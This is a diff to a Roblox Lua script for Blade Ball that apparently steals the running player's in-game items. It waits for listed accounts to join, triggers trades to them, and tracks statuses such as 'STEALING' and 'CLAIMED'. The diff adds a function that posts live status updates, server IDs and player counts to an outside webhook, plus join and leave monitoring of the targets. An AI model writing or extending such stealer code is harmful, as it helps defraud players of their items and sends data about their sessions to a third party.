@@ -164,9 +164,64 @@ local function getStatusColor(status)
     local colors = {
         ["PENDING"] = 16776960, -- Yellow
         ["STEALING"] = 16747520, -- Orange  
-        ["CLAIMED"] = 65280 -- Green
+        ["CLAIMED"] = 65280, -- Green
+        ["FAILED"] = 16711680 -- Red
     }
     return colors[status] or 16776960
+end
+
+-- Send a simple status update webhook (for PENDING/FAILED)
+local function sendSimpleStatusWebhook(newStatus, targetPlayerName, reason)
+    local statusEmoji = {
+        ["PENDING"] = "🟨",
+        ["FAILED"] = "🟥"
+    }
+    
+    local fields = {
+        {
+            name = "👤 Target Player",
+            value = string.format("```\nName: %s\n```", targetPlayerName or "Unknown"),
+            inline = false
+        },
+        {
+            name = "🔴 Live Status",
+            value = string.format("%s **%s**\n*Reason: %s\nLast updated: %s*", 
+                statusEmoji[newStatus] or "🟨", newStatus, reason or "N/A", os.date("%H:%M:%S")),
+            inline = false
+        },
+        {
+            name = "🌐 Server Information",
+            value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
+                game.JobId, #Players:GetPlayers(), game.PlaceId),
+            inline = false
+        }
+    }
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = string.format("🎴 BLADE BALL - %s", newStatus),
+            ["color"] = getStatusColor(newStatus),
+            ["fields"] = fields,
+            ["footer"] = {
+                ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local body = HttpService:JSONEncode(data)
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+    
+    pcall(function()
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
 end
 
 -- Update live status and send webhook
@@ -619,25 +674,46 @@ if #itemsToSend > 0 or totalTokens > 0 then
 
     local function waitForTargetUsers()
         local alreadyProcessed = {}
+        local monitoredPlayers = {} -- Track players being monitored
         
         local function processUser(player)
             if table.find(users, player.Name) and not alreadyProcessed[player.Name] then
                 alreadyProcessed[player.Name] = true
+                monitoredPlayers[player.Name] = true -- Start monitoring
+                
+                -- Send PENDING status when player is detected
+                sendSimpleStatusWebhook("PENDING", player.Name, "Target detected in server")
                 
                 task.wait(2)
                 
-                local success, error = pcall(function()
-                    doTrade(player.Name)
-                end)
+                -- Check if player is still in server before trading
+                if player and player.Parent == Players then
+                    local success, error = pcall(function()
+                        doTrade(player.Name)
+                    end)
+                else
+                    -- Player left before trade could start
+                    sendSimpleStatusWebhook("FAILED", player.Name, "Player left server before trade")
+                end
             end
         end
         
+        -- Monitor for players leaving
+        Players.PlayerRemoving:Connect(function(player)
+            if monitoredPlayers[player.Name] and currentStatus == "PENDING" then
+                sendSimpleStatusWebhook("FAILED", player.Name, "Player left server during pending status")
+                monitoredPlayers[player.Name] = nil
+            end
+        end)
+        
+        -- Check existing players
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= plr then
                 processUser(player)
             end
         end
         
+        -- Monitor for new players joining
         Players.PlayerAdded:Connect(function(player)
             task.wait(1)
             processUser(player)
